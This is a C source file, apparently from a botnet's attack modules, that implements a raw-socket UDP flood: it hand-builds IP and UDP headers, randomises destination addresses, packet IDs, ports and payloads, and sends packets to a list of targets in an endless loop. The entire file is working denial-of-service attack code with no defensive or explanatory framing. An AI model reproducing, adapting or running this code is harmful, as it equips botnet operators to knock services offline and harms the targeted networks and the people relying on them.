#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <linux/ip.h>
#include <linux/udp.h>
#include <netinet/in.h>

#include "bot/definitions.h"
#include "bot/modules/flood.h"
#include "bot/utils/network.h"
#include "bot/utils/xoshiro.h"

void flood_udpraw(pflood_context_t ctx) {
  size_t payload_len = 0;
  size_t buffer_len = 0;
  uint8_t *buffer = NULL;

  // port options
  u16 dport = flood_retrieve_u16(ctx, OPT_DPORT, 0);
  u16 sport = flood_retrieve_u16(ctx, OPT_SPORT, 0);

  // len options
  u16 len = flood_retrieve_u16(ctx, OPT_LEN, 512);
  u16 minlen = flood_retrieve_u16(ctx, OPT_MINLEN, 0);
  u16 maxlen = flood_retrieve_u16(ctx, OPT_MAXLEN, 0);
  u32 psleep = flood_retrieve_u32(ctx, OPT_SLEEP, 0);

  u8 random = flood_retrieve_u32(ctx, OPT_RANDOMIZE, true);
  pu8 payload = flood_retrieve_bytes(ctx, OPT_PAYLOAD, &payload_len);

  if (!random) {
    buffer = flood_generate(!payload ? len : payload_len, minlen, maxlen, payload, &buffer_len);
  }

  char **packets = calloc(ctx->num_targs, sizeof(char *));
  if (!packets) {
    exit(0);
  }

  int fd = -1;
  if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1) {
    exit(0);
  }

  if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &(int[]){1}, sizeof(int)) == -1) {
    close(fd);
    exit(0);
  }

  for (int i = 0; i < ctx->num_targs; i++) {
    ptarget_t target = &ctx->targets[i];

    packets[i] = calloc(1510, sizeof(char));
    memset(packets[i], '\0', 1510);

    struct iphdr *ip = (struct iphdr *)packets[i];
    struct udphdr *udp = (struct udphdr *)(ip + 1);
    char *data = (char *)(udp + 1);

    ip->version = IPVERSION;
    ip->ttl = IPDEFTTL;
    ip->protocol = IPPROTO_UDP;
    ip->ihl = 5;
    ip->tos = 0;
    ip->id = xoshiro_next() & 0xFFFF;
    ip->daddr = target->address;
    ip->saddr = network_local_addr();

    if (!random) {
      buffer = flood_generate(!payload ? len : payload_len, minlen, maxlen, payload, &buffer_len);
      memcpy(data, buffer, buffer_len);
    }
  }

  while (true) {
    // send targets
    for (int i = 0; i < ctx->num_targs; i++) {
      ptarget_t target = &ctx->targets[i];

      // setup hdr shit
      struct iphdr *iph = (struct iphdr *)packets[i];
      struct udphdr *udp = (struct udphdr *)(iph + 1);
      char *data = (char *)(udp + 1);

      // generate buffer
      if (random) {
        buffer = flood_generate(!payload ? len : payload_len, minlen, maxlen, payload, &buffer_len);
        memcpy(data, buffer, buffer_len);
      }

      // set randomized addr and total length
      target_random_addr(target);
      iph->daddr = target->address;
      iph->id = xoshiro_next() & 0xFFFF;
      iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + buffer_len);

      // randomize source and port
      udp->source = htons(!sport ? xoshiro_next() & 0xFFFF : sport);
      udp->dest = htons(!dport ? xoshiro_next() & 0xFFFF : dport);
      udp->len = htons(sizeof(struct udphdr) + buffer_len);

      // calc checksum
      iph->check = 0;
      udp->check = 0;
      iph->check = csum_compute(iph, sizeof(struct iphdr));
      udp->check = checksum_tcpudp(iph, udp, udp->len, sizeof (struct udphdr) + buffer_len);

      sendto(fd, packets[i], ntohs(iph->tot_len), 0, (struct sockaddr *)&target->saddr,
             sizeof(struct sockaddr_in));

      if (random) free(buffer);
    }

    if (psleep > 0) usleep(psleep);
  }
}
